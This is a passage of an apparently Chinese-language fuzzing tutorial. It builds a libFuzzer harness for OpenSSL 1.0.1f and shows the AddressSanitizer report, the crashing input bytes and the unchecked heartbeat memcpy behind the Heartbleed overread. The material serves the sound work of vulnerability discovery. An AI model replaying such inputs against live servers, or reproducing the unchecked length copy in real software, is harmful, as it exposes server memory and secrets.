<span class="number">465</span> ft: <span class="number">521</span> corp: <span class="number">6</span>/<span class="number">23</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">58</span>Mb L: <span class="number">6</span>/<span class="number">6</span> MS: <span class="number">2</span> CrossOver-CrossOver-</span><br><span class="line">#<span class="number">475</span>NEW    cov: <span class="number">467</span> ft: <span class="number">523</span> corp: <span class="number">7</span>/<span class="number">28</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">58</span>Mb L: <span class="number">5</span>/<span class="number">6</span> MS: <span class="number">3</span> PersAutoDict-ChangeByte-ShuffleBytes- DE: <span class="string">&quot;\xfd\x03\x00\x00&quot;</span>-</span><br><span class="line">#<span class="number">1025</span>NEW    cov: <span class="number">467</span> ft: <span class="number">526</span> corp: <span class="number">8</span>/<span class="number">39</span>b lim: <span class="number">11</span> exec/s: <span class="number">0</span> rss: <span class="number">81</span>Mb L: <span class="number">11</span>/<span class="number">11</span> MS: <span class="number">5</span> CopyPart-ShuffleBytes-CrossOver-ShuffleBytes-ChangeBinInt-</span><br><span class="line">#<span class="number">1097</span>NEW    cov: <span class="number">474</span> ft: <span class="number">549</span> corp: <span class="number">9</span>/<span class="number">49</span>b lim: <span class="number">11</span> exec/s: <span class="number">0</span> rss: <span class="number">84</span>Mb L: <span class="number">10</span>/<span class="number">11</span> MS: <span class="number">2</span> ChangeBit-CopyPart-</span><br><span class="line">#<span class="number">1293</span>REDUCE cov: <span class="number">474</span> ft: <span class="number">549</span> corp: <span class="number">9</span>/<span class="number">48</span>b lim: <span class="number">11</span> exec/s: <span class="number">0</span> rss: <span class="number">92</span>Mb L: <span class="number">10</span>/<span class="number">10</span> MS: <span class="number">1</span> EraseBytes-</span><br></pre></td></tr></table></figure><p>选择合适的编译器和编译选项，完成对该库的源码编译，生成.a文件。接下来就要研究编写fuzzer接口函数了。<br>workshop提供了openssl_fuzzer.cc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CERT_PATH</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CERT_PATH</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">SSL_CTX *<span class="title function_">Init</span><span class="params">()</span> &#123;</span><br><span class="line">  SSL_library_init();</span><br><span class="line">  SSL_load_error_strings();</span><br><span class="line">  ERR_load_BIO_strings();</span><br><span class="line">  OpenSSL_add_all_algorithms();</span><br><span class="line">  SSL_CTX *sctx;</span><br><span class="line">  assert (sctx = SSL_CTX_new(TLSv1_method()));</span><br><span class="line">  <span class="comment">/* These two file were created with this command:</span></span><br><span class="line"><span class="comment">      openssl req -x509 -newkey rsa:512 -keyout server.key \</span></span><br><span class="line"><span class="comment">     -out server.pem -days 9999 -nodes -subj /CN=a/</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH <span class="string">&quot;server.pem&quot;</span>,</span><br><span class="line">                                      SSL_FILETYPE_PEM));</span><br><span class="line">  assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH <span class="string">&quot;server.key&quot;</span>,</span><br><span class="line">                                     SSL_FILETYPE_PEM));</span><br><span class="line">  <span class="keyword">return</span> sctx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">  <span class="type">static</span> SSL_CTX *sctx = Init();</span><br><span class="line">  SSL *server = SSL_new(sctx);</span><br><span class="line">  BIO *sinbio = BIO_new(BIO_s_mem());</span><br><span class="line">  BIO *soutbio = BIO_new(BIO_s_mem());</span><br><span class="line">  SSL_set_bio(server, sinbio, soutbio);</span><br><span class="line">  SSL_set_accept_state(server);</span><br><span class="line">  BIO_write(sinbio, Data, Size);</span><br><span class="line">  SSL_do_handshake(server);</span><br><span class="line">  SSL_free(server);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就涉及到openssl库提供的相关方法了，本篇主要讲解fuzz相关，就不细讲openssl了。总之就是要先搞清楚openssl的用法，再通过include openssl提供的函数来对openssl进行fuzz。编译如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer \</span><br><span class="line">    -I openssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \</span><br><span class="line">    ../../libFuzzer/Fuzz/libFuzzer.a -o openssl_fuzzer</span><br></pre></td></tr></table></figure><p>-I指定inlcude的搜索路径，同时链接静态库libcrypto.a和libFuzzer.a以使用库中的函数。</p><p>运行跑出crash:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">24646</span>REDUCE cov: <span class="number">611</span> ft: <span class="number">889</span> corp: <span class="number">50</span>/<span class="number">1105</span>b lim: <span class="number">116</span> exec/s: <span class="number">24646</span> rss: <span class="number">382</span>Mb L: <span class="number">64</span>/<span class="number">77</span> MS: <span class="number">5</span> InsertRepeatedBytes-PersAutoDict-InsertByte-ShuffleBytes-ChangeBit- DE: <span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x04&quot;</span>-</span><br><span class="line">#<span class="number">25193</span>REDUCE cov: <span class="number">611</span> ft: <span class="number">889</span> corp: <span class="number">50</span>/<span class="number">1097</span>b lim: <span class="number">116</span> exec/s: <span class="number">25193</span> rss: <span class="number">382</span>Mb L: <span class="number">61</span>/<span class="number">77</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">2133</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x629000009748</span> at pc <span class="number">0x00000051eaba</span> bp <span class="number">0x7ffd255dae50</span> sp <span class="number">0x7ffd255da618</span></span><br><span class="line">READ of size <span class="number">21050</span> at <span class="number">0x629000009748</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x51eab9</span> in __asan_memcpy /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:<span class="number">22</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x55e323</span> in tls1_process_heartbeat /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/t1_lib.c:<span class="number">2586</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x5cb97d</span> in ssl3_read_bytes /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_pkt.c:<span class="number">1092</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x5cff83</span> in ssl3_get_message /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_both.c:<span class="number">457</span>:<span class="number">7</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x59ac86</span> in ssl3_get_client_hello /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_srvr.c:<span class="number">941</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x596ac1</span> in ssl3_accept /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_srvr.c:<span class="number">357</span>:<span class="number">9</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x5518ad</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl_fuzzer.cc:<span class="number">39</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x459a01</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">553</span>:<span class="number">15</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x459245</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">469</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x45b4e7</span> in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">695</span>:<span class="number">19</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x45c205</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">831</span>:<span class="number">5</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x449fc8</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">825</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x473432</span> in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">13</span> <span class="number">0x7f40a3932bf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line">    #<span class="number">14</span> <span class="number">0x41e159</span> in _start (/home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl_fuzzer2+<span class="number">0x41e159</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x629000009748</span> is located <span class="number">0</span> bytes to the right of <span class="number">17736</span>-<span class="type">byte</span> region [<span class="number">0x629000005200</span>,<span class="number">0x629000009748</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x51f67d</span> in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:<span class="number">145</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x60091b</span> in CRYPTO_malloc /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/crypto/mem.c:<span class="number">308</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x5d1737</span> in freelist_extract /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_both.c:<span class="number">708</span>:<span class="number">12</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x5d1737</span> in ssl3_setup_read_buffer /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_both.c:<span class="number">770</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x5d1d4c</span> in ssl3_setup_buffers /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_both.c:<span class="number">827</span>:<span class="number">7</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x597703</span> in ssl3_accept /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_srvr.c:<span class="number">292</span>:<span class="number">9</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x5518ad</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl_fuzzer.cc:<span class="number">39</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x459a01</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">553</span>:<span class="number">15</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x45b8a5</span> in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">740</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x45be79</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">793</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x449fc8</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">825</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x473432</span> in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span>:<span class="number">10</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x7f40a3932bf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:<span class="number">22</span>:<span class="number">3</span> in __asan_memcpy</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c527fff9290</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c527fff92a0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c527fff92b0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c527fff92c0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c527fff92d0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x0c527fff92e0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>[fa]fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff92f0</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff9300</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff9310</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff9320</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c527fff9330</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow <span class="type">byte</span> legend (one shadow <span class="type">byte</span> represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">2133</span>==ABORTING</span><br><span class="line">MS: <span class="number">2</span> ChangeBinInt-InsertByte-; base unit: <span class="number">7</span>bfa057a7ae6a7bc6ea487749407e4e7d4e9bf84</span><br><span class="line"><span class="number">0x15</span>,<span class="number">0x3</span>,<span class="number">0xd4</span>,<span class="number">0x0</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x3a</span>,<span class="number">0x1</span>,<span class="number">0x3a</span>,<span class="number">0x1</span>,<span class="number">0xd3</span>,<span class="number">0xb3</span>,<span class="number">0x18</span>,<span class="number">0x3</span>,<span class="number">0xd4</span>,<span class="number">0x0</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x52</span>,<span class="number">0x3a</span>,<span class="number">0x1</span>,<span class="number">0x3a</span>,<span class="number">0x9</span>,<span class="number">0xd3</span>,<span class="number">0xb3</span>,<span class="number">0x18</span>,<span class="number">0x2c</span>,<span class="number">0x0</span>,<span class="number">0x7</span>,<span class="number">0x2</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x3a</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,</span><br><span class="line">\x15\x03\xd4\x00\x07\x01:\x01:\x01\xd3\xb3\x18\x03\xd4\x00\x07\x01R:\x01:\x09\xd3\xb3\x18,\x00\x07\x02\x07\x01:\x01\x00</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash<span class="number">-4</span>bfb53055de3fed318590b20ddd4cda0d95e8ed8</span><br><span class="line">Base64: FQPUAAcBOgE6AdOzGAPUAAcBUjoBOgnTsxgsAAcCBwE6AQA=</span><br></pre></td></tr></table></figure><p>通过SUMMARY容易找到造成heap_overflow的漏洞点在于:<code>/local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cc:22:3 in __asan_memcpy</code>这种目录一看就是很底层的目录，不易定位。再往找一层:<code>#1 0x55e323 in tls1_process_heartbeat /home/admin/libfuzzer-workshop/lessons/05/openssl1.0.1f/ssl/t1_lib.c:2586:3</code>这就很容易定位了，接下来就是漏洞溯源了。<br>定位到了代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">tls1_process_heartbeat(SSL *s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p = &amp;s-&gt;s3-&gt;rrec.data[<span class="number">0</span>], *pl;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hbtype;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> payload;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> padding = <span class="number">16</span>; <span class="comment">/* Use minimum padding */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read type and payload length first */</span></span><br><span class="line">hbtype = *p++;</span><br><span class="line">n2s(p, payload);</span><br><span class="line">pl = p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;msg_callback)</span><br><span class="line">s-&gt;msg_callback(<span class="number">0</span>, s-&gt;version, TLS1_RT_HEARTBEAT,</span><br><span class="line">&amp;s-&gt;s3-&gt;rrec.data[<span class="number">0</span>], s-&gt;s3-&gt;rrec.length,</span><br><span class="line">s, s-&gt;msg_callback_arg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hbtype == TLS1_HB_REQUEST)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *buffer, *bp;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate memory for the response, size is 1 bytes</span></span><br><span class="line"><span class="comment"> * message type, plus 2 bytes payload length, plus</span></span><br><span class="line"><span class="comment"> * payload, plus padding</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">buffer = OPENSSL_malloc(<span class="number">1</span> + <span class="number">2</span> + payload + padding);</span><br><span class="line">bp = buffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Enter response type, length and copy payload */</span></span><br><span class="line">*bp++ = TLS1_HB_RESPONSE;</span><br><span class="line">s2n(payload, bp);</span><br><span class="line"><span class="built_in">memcpy</span>(bp, pl, payload);   <span class="comment">//漏洞点</span></span><br><span class="line">bp += payload;</span><br><span class="line"><span class="comment">/* Random padding */</span></span><br><span class="line">RAND_pseudo_bytes(bp, padding);</span><br><span class="line"></span><br><span class="line">r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, <span class="number">3</span> + payload + padding);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r &gt;= <span class="number">0</span> &amp;&amp; s-&gt;msg_callback)</span><br><span class="line">s-&gt;msg_callback(<span class="number">1</span>, s-&gt;version, TLS1_RT_HEARTBEAT,</span><br><span class="line">buffer, <span class="number">3</span> + payload + padding,</span><br><span class="line">s, s-&gt;msg_callback_arg);</span><br><span class="line"></span><br><span class="line">OPENSSL_free(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (hbtype == TLS1_HB_RESPONSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> seq;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We only send sequence numbers (2 bytes unsigned int),</span></span><br><span class="line"><span class="comment"> * and 16 random bytes, so we just try to read the</span></span><br><span class="line"><span class="comment"> * sequence number */</span></span><br><span class="line">n2s(pl, seq);</span><br><span class="line"></span><br><span class="line"><span 